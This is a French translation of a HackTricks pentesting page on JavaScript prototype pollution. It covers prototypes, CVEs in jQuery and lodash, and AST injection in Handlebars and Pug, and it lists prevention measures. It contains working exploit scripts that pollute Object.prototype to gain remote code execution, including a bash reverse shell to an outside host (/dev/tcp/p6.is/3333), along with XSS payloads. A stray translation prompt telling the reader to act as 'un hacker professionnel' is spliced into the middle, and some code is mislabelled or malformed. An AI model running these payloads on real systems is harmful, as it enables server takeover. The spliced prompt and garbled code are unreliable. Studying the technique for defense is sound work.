## Objets en JavaScript <a href="#053a" id="053a"></a>

Tout d'abord, nous devons comprendre `Object`en JavaScript. Un objet est simplement une collection de paires clé-valeur, souvent appelées propriétés de cet objet. Par exemple:

![](<../../../.gitbook/assets/image (389) (1).png>)

En JavaScript, `Object`est un objet de base, le modèle pour tous les objets nouvellement créés. Il est possible de créer un objet vide en passant `null`à `Object.create`. Cependant, le nouvel objet créé aura également un type qui correspond au paramètre passé et hérite de toutes les propriétés de base.
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

Précédemment, nous avons appris qu'un objet en javascript est une collection de clés et de valeurs, il est donc logique qu'un objet `null` soit simplement un dictionnaire vide : `{}`.

## Fonctions / Classes en Javascript <a href="#55dd" id="55dd"></a>

En Javascript, les concepts de classe et de fonction sont assez interdépendants (la fonction elle-même agit en tant que constructeur pour la classe et la nature réelle n'a pas de concept de "classe" en javascript). Voyons l'exemple suivant :
```javascript
function person(fullName, age) {
    this.age = age;
    this.fullName = fullName;
    this.details = function() {
        return this.fullName + " has age: " + this.age;
    }
}
```
![](<../../../.gitbook/assets/image (361).png>)

Vous êtes un hacker professionnel, traducteur et écrivain. Vous écrivez tout de manière très claire et aussi concise que possible sans perdre d'informations. Le contenu suivant est extrait d'un livre de piratage sur les techniques de piratage de cloud, de plateformes SaaS, de CI/CD... Le contenu suivant provient du fichier /hive/hacktricks/pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md. Traduisez le texte anglais pertinent en français et renvoyez la traduction en conservant la syntaxe markdown. Ne traduisez pas les choses comme le code, les noms de techniques de piratage, les noms de plateformes cloud/SaaS (comme Workspace, aws, gcp...), le mot 'leak' et les balises markdown. N'ajoutez également rien d'autre que la traduction et la syntaxe markdown.
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## Prototypes en JavaScript <a href="#3843" id="3843"></a>

Il convient de noter que l'attribut prototype peut être modifié/supprimé lors de l'exécution du code. Par exemple, des fonctions peuvent être ajoutées dynamiquement à la classe :

![](<../../../.gitbook/assets/image (363).png>)

Les fonctions de la classe peuvent également être modifiées (comme `toString` ou `valueOf` dans les cas suivants) :

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## Héritage

Dans un programme basé sur des prototypes, les objets héritent des propriétés/méthodes des classes. Les classes sont dérivées en ajoutant des propriétés/méthodes à une instance d'une autre classe ou en les ajoutant à un objet vide.

Notez que si vous ajoutez une propriété à un objet qui est utilisé comme prototype pour un ensemble d'objets (comme myPersonObj), les objets pour lesquels il est le prototype obtiennent également la nouvelle propriété, mais cette propriété n'est pas imprimée à moins d'être spécifiquement appelée.

![](<../../../.gitbook/assets/image (366).png>)

## Pollution de \_\_proto\_\_ <a href="#0d0a" id="0d0a"></a>

Vous devriez déjà savoir que **chaque objet en JavaScript est simplement une collection de paires clé-valeur** et que **chaque objet hérite du type Object en JavaScript**. Cela signifie que si vous êtes capable de polluer le type Object, **chaque objet JavaScript de l'environnement sera pollué !**

C'est assez simple, il vous suffit de pouvoir modifier certaines propriétés (paires clé-valeur) d'un objet JavaScript arbitraire, car chaque objet hérite du schéma Object.
```javascript
function person(fullName) {
    this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
À partir de l'exemple précédent, il est possible d'accéder à la structure de l'objet en utilisant les méthodes suivantes :
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
Ainsi, comme mentionné précédemment, si une propriété est ajoutée au schéma d'objet, chaque objet JavaScript aura accès à la nouvelle propriété:
```javascript
function person(fullName) {
    this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
Maintenant, chaque objet JS contiendra les nouvelles propriétés : la fonction `printHello` et la nouvelle constante `globalconstant`.

## Pollution de prototype

Cette technique n'est pas aussi efficace que la précédente car vous ne pouvez pas polluer le schéma de l'objet JS. Mais dans les cas où le mot-clé `__proto__` est interdit, cette technique peut être utile.

Si vous êtes capable de modifier les propriétés d'une fonction, vous pouvez modifier la propriété `prototype` de la fonction et **chaque nouvelle propriété que vous ajoutez ici sera héritée par chaque objet créé à partir de cette fonction :**
```javascript
function person(fullName) {
    this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
Dans ce cas, seuls les **objets créés à partir de la classe `person`** seront affectés, mais chacun d'entre eux héritera désormais des propriétés `sayHello` et `newConstant`.

Il y a 2 façons d'exploiter la pollution de prototype pour contaminer CHAQUE objet JS.

La première consiste à polluer le prototype de propriété de **Object** (comme mentionné précédemment, chaque objet JS hérite de celui-ci) :
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
Si vous parvenez à le faire, chaque objet JS pourra exécuter la fonction `sayBye`.

L'autre méthode consiste à polluer le prototype d'un constructeur d'une variable de dictionnaire comme dans l'exemple suivant:
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
Après l'exécution de ce code, **chaque objet JS sera capable d'exécuter la fonction `sayHey`**.

## Pollution d'autres objets

### D'une classe à Object.prototype

Dans un scénario où vous pouvez **polluer un objet spécifique** et que vous devez **atteindre `Object.prototype`**, vous pouvez le rechercher avec quelque chose comme le code suivant:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
  if (window[key]?.constructor.prototype === Object.prototype) {
    console.log(key)
  }
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
  for(let key2 in document.querySelector('a')[key1]) {
    if (document.querySelector('a')[key1][key2] === window) {
      console.log(key1 + "." + key2)
    }
  }
}
```
### Pollution des éléments d'un tableau

Notez que comme vous pouvez polluer les attributs des objets en JS, si vous avez accès pour polluer un tableau, vous pouvez également **polluer les valeurs du tableau** accessibles **par index** (notez que vous ne pouvez pas écraser les valeurs, vous devez donc polluer les index qui sont utilisés d'une manière ou d'une autre mais pas écrits).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Pollution des éléments HTML

Lors de la génération d'un élément HTML via JS, il est possible de **remplacer** l'attribut **`innerHTML`** pour écrire du **code HTML arbitraire**. [Idée et exemple tirés de cet article](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Exemples

### Exemple de base

Alors où se trouve la pollution de prototype ? Elle se produit lorsqu'il y a un bug dans l'application qui permet de remplacer les propriétés de `Object.prototype`. Étant donné que chaque objet typique hérite de ses propriétés de `Object.prototype`, nous pouvons modifier le comportement de l'application. L'exemple le plus couramment présenté est le suivant :
```javascript
if (user.isAdmin) {   // do something important!}
```
Imaginez que nous avons une pollution de prototype qui permet de définir `Object.prototype.isAdmin = true`. Ensuite, à moins que l'application n'ait explicitement attribué une valeur, `user.isAdmin` est toujours vrai !

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

Par exemple, `obj[a][b] = value`. Si l'attaquant peut contrôler la valeur de `a` et `value`, alors il suffit de régler la valeur de `a` sur `__proto__` (en javascript, `obj["__proto__"]` et `obj.__proto__` sont complètement équivalents) puis la propriété `b` de tous les objets existants dans l'application sera attribuée à `value`.

Cependant, l'attaque n'est pas aussi simple que celle décrite ci-dessus, selon [le document](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf), nous ne pouvons attaquer que lorsque l'une des trois conditions suivantes est remplie :

* Effectuer une fusion récursive
* Définition de propriété par chemin
* Cloner un objet

### Remplacement de fonction
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Pollution de prototype pour RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Pollution de prototype côté client pour XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019–11358: Attaque de pollution de prototype via jQuery $ .extend

$ .extend, s'il est mal géré, peut changer les propriétés de l'objet `prototype` (le modèle des objets dans l'application). Cet attribut apparaîtra alors sur tous les objets. Notez que seule la version "profonde" (c'est-à-dire g) de $ .extened est affectée.

Les programmeurs utilisent souvent cette fonction pour dupliquer un objet ou remplir de nouvelles propriétés à partir d'un objet par défaut. Par exemple:

Nous pouvons imaginer que `myObject` est un champ d'entrée de l'utilisateur et est sérialisé dans la base de données)

Dans ce code, nous pensons souvent, lors de l'exécution, que l'attribut `isAdmin` sera affecté au nouvel objet créé. Mais essentiellement, il est affecté directement à `{}` et ensuite `{}.isAdmin` sera `true`. Si après ce code, nous effectuons la vérification suivante:
```javascript
If (user.isAdmin === true) {
    // do something for admin
}
```
Si l'utilisateur n'existe pas encore (`undefined`), la propriété `isAdmin` sera recherchée dans son objet parent, qui est l'objet ajouté `isAdmin` avec la valeur `true` ci-dessus.

Un autre exemple lorsqu'il est exécuté sur JQuery 3.3.1:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
Ces erreurs peuvent affecter de nombreux projets Javascript, en particulier les projets NodeJS, l'exemple le plus pratique étant l'erreur de Mongoose, la bibliothèque JS qui aide à manipuler MongoDB, en décembre 2018.

### CVE-2018-3721, CVE-2019-10744: Attaque de pollution de prototype via lodash

[Lodash](https://www.npmjs.com/package/lodash) est également une bibliothèque bien connue qui fournit de nombreuses fonctions différentes, nous aidant à écrire du code de manière plus pratique et plus soignée avec plus de 19 millions de téléchargements hebdomadaires. Et il a eu le même problème que JQuery.

**CVE-2018-3721**

**CVE-2019-10744**

Ce bogue affecte toutes les versions de Lodash, déjà corrigé dans la version 4.17.11.

### Un autre tutoriel avec des CVE

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

## Pollution de prototype AST

En NodeJS, AST est utilisé en JS très souvent, comme les moteurs de template et TypeScript, etc.\
Pour le moteur de template, la structure est comme indiqué ci-dessus.

![img](https://blog.p6.is/img/2020/08/graph\_3.jpg)

### Handlebars

Info prise sur [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

Vous pouvez insérer n'importe quelle chaîne dans `Object.prototype.pendingContent` pour déterminer la possibilité d'une attaque.\
Cela vous permet de vous assurer que les serveurs utilisent le moteur de Handlebars lorsqu'une pollution de prototype existe dans un environnement de boîte noire.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
	if (this.pendingContent) {
		content = this.pendingContent + content;
	} else {
		this.pendingLocation = this.source.currentLocation;
	}

	this.pendingContent = content;
},
pushSource: function pushSource(source) {
	if (this.pendingContent) {
		this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
		this.pendingContent = undefined;
	}

	if (source) {
		this.source.push(source);
	}
}
...
```
Cela est réalisé par la fonction `appendContent` de `javascript-compiler.js`.\
`appendContent` est comme suit. Si `pendingContent` est présent, il est ajouté au contenu et renvoyé.

`pushSource` rend `pendingContent` indéfini, empêchant ainsi la chaîne d'être insérée plusieurs fois.

**Exploitation**

![img](https://blog.p6.is/img/2020/08/graph\_5.jpg)

Handlebars fonctionne comme indiqué dans le graphique ci-dessus.

Après la génération de l'AST par le lexer et le parser, il est transmis à `compiler.js`.\
Nous pouvons exécuter la fonction de modèle générée par le compilateur avec certains arguments. Et cela renvoie la chaîne comme "Bonjour posix" (lorsque msg est posix).
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
    this.$ = { type: 'NumberLiteral', value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) };
    break;
```
Le parseur de Handlebars force la valeur d'un nœud dont le type est NumberLiteral à être toujours un nombre grâce au constructeur Number. Cependant, il est possible d'insérer une chaîne non numérique ici en utilisant la pollution de prototype.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
  // Just return if an already-compiled AST was passed in.
  if (input.type === 'Program') {
    return input;
  }

  _parser2['default'].yy = yy;

  // Altering the shared object here, but this is ok as parser is a sync operation
  yy.locInfo = function (locInfo) {
    return new yy.SourceLocation(options && options.srcName, locInfo);
  };

  var ast = _parser2['default'].parse(input);

  return ast;
}

function parse(input, options) {
  var ast = parseWithoutProcessing(input, options);
  var strip = new _whitespaceControl2['default'](options);

  return strip.accept(ast);
}
```
Tout d'abord, regardez la fonction de compilation, elle prend en charge deux façons d'entrée, l'objet AST et la chaîne de modèle.

Lorsque le type d'entrée est un `Program`, bien que la valeur d'entrée soit en réalité une chaîne de caractères.\
Le parseur considère qu'elle est déjà analysée en AST par parser.js et l'envoie au compilateur sans aucun traitement.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
    /* istanbul ignore next: Sanity code */
    if (!this[node.type]) {
        throw new _exception2['default']('Unknown type: ' + node.type, node);
    }

    this.sourceNode.unshift(node);
    var ret = this[node.type](node);
    this.sourceNode.shift();
    return ret;
},
Program: function Program(program) {
    console.log((new Error).stack)
    this.options.blockParams.unshift(program.blockParams);

    var body = program.body,
        bodyLength = body.length;
    for (var i = 0; i < bodyLength; i++) {
        this.accept(body[i]);
    }

    this.options.blockParams.shift();

    this.isSimple = bodyLength === 1;
    this.blockParams = program.blockParams ? program.blockParams.length : 0;

    return this;
}
```
Le compilateur prend l'objet AST (en fait une chaîne de caractères) et l'envoie à la méthode `accept`.\
`accept` appelle `this[node.type]` du compilateur.\
Ensuite, il prend l'attribut `body` de l'AST et l'utilise pour construire une fonction.
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
    "type": "MustacheStatement",
    "path": 0,
    "params": [{
        "type": "NumberLiteral",
        "value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
    }],
    "loc": {
        "start": 0,
        "end": 0
    }
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
    var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
            return parent[propertyName];
        }
        return undefined
    };

    return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
        "name": "undefined",
        "hash": {},
        "data": data,
        "loc": {
            "start": 0,
            "end": 0
        }
    })) != null ? stack1 : "");
}
*/
```
En conséquence, une attaque peut être configurée comme ceci. Si vous avez parcouru l'analyseur syntaxique, spécifiez une chaîne qui ne peut pas être assignée à la valeur de NumberLiteral. Mais une fois que l'AST injecté est traité, nous pouvons insérer n'importe quel code dans la fonction.

**Exemple**

[https://github.com/hughsk/flat/issues/105](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
})

# execute
requests.get(TARGET_URL)
```
### Pug

Plus d'informations sur [https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
    }
})

# execute
requests.get(TARGET_URL)
```
## Comment puis-je prévenir?

* Geler les propriétés avec Object.freeze (Object.prototype)
* Effectuer une validation sur les entrées JSON conformément au schéma de l'application
* Éviter d'utiliser des fonctions de fusion récursives de manière non sécurisée
* Utiliser des objets sans propriétés de prototype, tels que `Object.create(null)`, pour éviter d'affecter la chaîne de prototype
* Utiliser `Map` au lieu de `Object`
* Mettre régulièrement à jour les nouveaux correctifs pour les bibliothèques

## Référence

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
